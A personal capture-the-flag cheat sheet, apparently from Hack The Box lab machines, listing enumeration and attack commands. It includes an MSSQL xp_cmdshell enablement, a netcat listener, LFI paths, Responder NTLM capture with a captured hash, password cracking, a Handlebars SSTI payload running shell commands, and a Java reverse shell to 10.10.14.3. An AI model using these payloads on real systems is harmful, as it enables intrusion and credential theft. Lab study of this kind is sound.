# CTF-Excalibur
CTF-Memo

-v : Increase the verbosity level (basically output more info)
-p- : This flag scans for all TCP ports ranging from 0-65535
-sV : Attempts to determine the version of the service running on a port
-sC : Scan with default NSE scripts
--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher

-sC: Performs a script scan using the default set of scripts. It is equivalent to --
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.
-sV: Enables version detection, which will detect what versions are running on what
port.

```
nmap -v -p- --min-rate 5000 -sV -sC 1.1.1.1
nmap -sV -sC 1.1.1.1

nmap -p80,5040,5985,7680 1.1.1.1
nmap -p- -sV -sC 1.1.1.1

nmap firewall

nmap -sC -Pn IP
nmap -Pn IP

curl -v http://1.1.1.1
return 302 not found
```

------------

smbclient  port 445

see shares

smbclient -L IP   
smbclient -L IP -U Administrator

smbclient //IP/C$ -U Administrator
smbclient -h IP

smbclient -N -L \\\\{TARGET_IP}\\
-N : No password
-L : This option allows you to look at what services are available on a server

PSexec.py

└──╼ [★]$ mssqlclient.py LOGIN:PASS@1.1.1.1 -windows-auth
└──╼ [★]$ mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.43.111 -windows-auth

SQL> xp_cmdshell dir
SQL> xp_cmdshell whoami
//print working directory  pwd
SQL> xp_cmdshell "powershell -c pwd"


https://github.com/SecureAuthCorp/impacket/tree/master/examples

-----------------------------

SMB 

Enumeration
nmap -sC -sV {TARGET_IP}

smbclient -N -L \\\\{TARGET_IP}\\
-N : No password
-L : This option allows you to look at what services are available on a server

We located a couple of interesting shares. Shares ADMIN$ & C$ cannot be accessed as the Access Denied
error states, however, we can try to access and enumerate the backups share by using the following
command:
smbclient -N \\\\{TARGET_IP}\\backups

get prod.dtsConfig

git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .

cd impacket/examples/
python3 mssqlclient.py -h


python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
-windows-auth : this flag is specified to use Windows Authentication

SELECT is_srvrolemember('sysadmin');

EXEC xp_cmdshell 'net user';

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; 
- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;


xp_cmdshell "whoami"

https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------



sudo python3 -m http.server 80

sudo nc -lvnp 443

------------------------------

gobuster

gobuster dir --url http://ignition.htp/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

------------
LFI or Local File Inclusion
RFI or Remote File Inclusion

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

examples
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

Include PHP : 
https://www.php.net/manual/en/function.include.php


Windows New Technology LAN Manager
 
sudo responder -I tun0
http://unika.htb/index.php?page=//10.10.14.3/somefile

subl hash
(paste in this file the hash)
Administrator::RESPONDER:3eadab5a430190d9:6206C352D675427BB3087B9EEBFFCA2A:010100000000000080EADEF0A27FD80177FDF3F5D7B9EBA40000000002000800470032004500430001001E00570049004E002D004400520049005500500052003100590045004300430004003400570049004E002D00440052004900550050005200310059004500430043002E0047003200450043002E004C004F00430041004C000300140047003200450043002E004C004F00430041004C000500140047003200450043002E004C004F00430041004C000700080080EADEF0A27FD801060004000200000008003000300000000000000001000000002000004DAC410366AD31A487458FD8E15A3ADF9D3B623141A688B2CD44B5A8784EE3600A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000

└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

connect to port 5985 with login / password

evil-winrm -i 10.129.229.59 -u Administrator -p badminton

read file on system : 
cat flag.txt

------------------------

magento 

login page : /admin

admin admin123
admin root123
admin password1
admin administrator1
admin changeme1
admin password123
admin qwerty123
admin administrator123
admin changeme123


------------------------

Node.js
webserver : express

vulnerability we test for by submitting {{7*7}}
Server Side Template Injection

Templating engine : Handlebars
name of the BurpSuite tab used to encode text : Decoder

--------------------

Burpsuite (intercepting HTTP traffic) (linked with plugin foxyproxy)

Proxy -> HTTP history
POST -> send to repeater

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}




---------------------


 
 Reverse shell
 
 netcat
 nc -lvnp 8000
 
 String host="10.10.14.3";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
 
 ---------------------
 
 FIRMWARE :

bin analysis

binwalk file.bin
binwalk -t file.bin
 
fdisk -l file.bin
 

 
 ENTROPY
 binwalk -E file.bin
 Is it encrypted?
 High entropy = probably encrypted (or compressed). Low entropy = probably not
 
 Extractor
 binwalk -e file.bin
 

 
 
 -------------------------
 
 
 telnet 1.1.1.1 1521
 
 
 --------------------------
 
 Search Tools 
 grep -r "login" /etc/
 
 Device_Admin   in telnetd.sh
 password in etc/config/sign


----------------
HARDWARE TOOLS

- https://www.pcbgogo.com/GerberViewer.html
- https://maxpromer.github.io/LCD-Character-Creator/
- https://onlinehextools.com/convert-hex-to-binary


------------

I2C communication :

 Wire.h to communicate with the i2c devices, the library functions take the 7 bit address and internally appends the 0 or 1 onto the end for write/read.
 
 7-bit I2C Slave Address
 8-bit I2C Slave Address
 10-bit I2C Slave Address
 https://www.totalphase.com/blog/2019/05/how-to-identify-the-i2c-slave-addressing-standard-for-developers/
 
 KEYPAD:
 https://github.com/RobTillaart/I2CKeyPad/blob/master/examples/I2CKeypad_interrupts_1/I2CKeypad_interrupts_1.ino
 
 LIQUID CRYSTAL LED 
 https://www.arduino.cc/reference/en/libraries/liquidcrystal-i2c/
 
 --------------------------------
 
 ANDROID
 
 
 SMALI Dalvik opcodes
 http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html
 https://hackcatml.tistory.com/category/Information%20Security/Android
 
 Conditional jump branch:

"if-eq vA, vB, :cond_ " If vA is equal to vB then go to: cond_
"if-ne vA, vB, :cond_ " If vA is not equal to vB then go to: cond_
"if-lt vA, vB , :cond_ " if vA is less than vB then go to: cond_
"if-ge vA, vB, :cond_ " if vA is greater than or equal to vB then go to: cond_
"if-gt vA, vB, :cond_ " if vA is greater than vB then jump to: cond_
"if-le vA, vB, :cond_ " If vA is less than or equal to vB then jump to: cond_
"if-eqz vA, :cond_ " If vA is equal to 0 then jump to: cond_
"if -nez vA, :cond_ "If vA is not equal to 0, jump to: cond_
"if-ltz vA, :cond_ " If vA is less than 0, jump to: cond_
"if-gez vA, :cond_ " If vA is greater than or equal to 0 jump to :cond_
"if-gtz vA, :cond_ " If vA is greater than 0 jump to :cond_
"if-lez vA, :cond_ " Jump to :cond_ if vA is less than or equal to 0

 
 https://www.youtube.com/watch?v=aKQLjNZZIKs&ab_channel=BigBrotherStream
 
 
 
-------------

Host: 
#add directly (without opening hosts file)
echo "10.129.152.221 thetoppers.htb" | sudo tee -a /etc/hosts



----enumeration----
Use an enumeration tool like `wfuzz`, `ffuf` etc.

ffuf -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"

ffuf -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" -fs 11952

---Enumeration with Gobuster ----

gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb





tldr 
https://github.com/tldr-pages/tldr
sudo pip3 install tldr

--------------------

Crunch

https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/

-b : the maximum size of the wordlist (requires -o START)
-c : numbers of lines to write to the wordlist (requires -o START)
-d : limit the number of duplicate characters
-e : stop generating words at a certain string
-f : specify a list of character sets from the charset.lst file
-i : invert the order of characters in the wordlist
-l : allows the literal interpretation of @,%^ when using -t
-o : the output wordlist file
-p : print permutations without repeating characters (cannot be used with -s)
-q : Like the -p option except it reads the strings from a specified file
-r : resume a previous session (cannot be used with -s)
-s : specify a particular string to begin the wordlist with
-t : set a specific pattern of @,%^
-z : compress the output wordlist file, accompanied by -o

Reference:
@ represents lowercase letters
, represents uppercase letters
% represents numbers
^ represents special characters

Examples:

1) > crunch 5 5 abcde14 -t @@@14 -d 2@ -o syskey.txt -z

A zipped syskey.txt wordlist starting with "aab14" and ending in "eed14" will be produced from the above. The reason why the start is not "aaa14" is because -d 2@ allows for only 2 duplicate lowercase letters. Adding -i would invert the results, and adding -e dde14 would stop after the line "dde14" (or "41edd" in the case of an inverted output) is produced.

-----------------------------------


Mongod Write-up

Connecting to MongoDB
In order to connect to the remote MongoDB server running on the target box, we will need to install the
mongodb utility, which can be done on Debian-based Linux distributions (like Parrot, Kali and Ubuntu) by
downloading the following tar archive file.
We must then extract the contents of the tar archive file using the tar utility.
Navigate to the location where the mongo binary is present.
Let's now try to connect to the MongoDB server running on the remote host as an anonymous user.
We have successfully connected to the remote MongoDB instance as an anonymous user. We can list the
databases present on the MongoDB server using the following command.

curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz

tar xvf mongodb-linux-x86_64-3.4.7.tgz

cd mongodb-linux-x86_64-3.4.7/bin

./mongo mongodb://{target_IP}:27017

____________________________________________________

s3.domaine.com

S3 bucket

awscli

aws configure

aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb






